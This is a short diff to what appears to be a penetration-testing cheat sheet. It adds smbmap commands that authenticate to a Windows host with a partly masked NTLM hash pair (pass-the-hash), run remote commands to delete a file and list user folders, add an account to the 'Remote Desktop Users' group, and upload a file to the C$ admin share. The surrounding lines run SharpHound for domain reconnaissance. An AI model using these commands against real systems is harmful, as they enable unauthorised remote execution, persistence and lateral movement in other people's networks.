@@ -44,4 +44,13 @@ Encrypted Bloodhound
 Import-Module .\SharpHound.ps1
 Invoke-BloodHound
 --------------------------------------------------------------------------------------------------------------------------------
+smbmap
 
+smbmap.exe -u user1 -p aad3b435b51404eeaad3b435b51404xx:2be3a5ceca80d28cd1ccd6b03b3448xx -H 10.13.xx.xx -x "del c:\output.txt"
+
+smbmap.exe -u user1 -p aad3b435b51404eeaad3b435b51404xx:2be3a5ceca80d28cd1ccd6b03b3448xx -H 10.13.xx.xx -x "dir c:\Users"
+
+ -x "net localgroup \"Remote Desktop Users\" test /add"
+ --upload c:\Users\pwctest2\Desktop\tools\CNM.txt "c$\\C.txt"
+ 
+--------------------------------------------------------------------------------------------------------------------------------
